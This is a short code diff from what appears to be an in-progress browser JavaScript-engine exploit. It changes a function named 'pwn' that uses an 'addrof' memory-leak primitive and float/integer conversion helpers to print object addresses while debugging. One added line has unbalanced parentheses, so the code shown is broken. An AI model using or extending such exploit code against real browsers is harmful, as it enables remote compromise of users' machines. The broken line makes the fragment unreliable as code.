@@ -131,8 +131,9 @@ function pwn() {
     var targetArray = [];
     var realjscell = primitives.addrof(targetArray);
     alert(primitives.addrof(targetArray[0]));
-    alert(realjscell + i2f(0x10));
-    alert(realjscell[0])
+    alert(realjscell + f2i(0x10));
+      alert(hex(realjscell + f2i(0x10));
+    alert(realjscell[0]);
     
 
 }
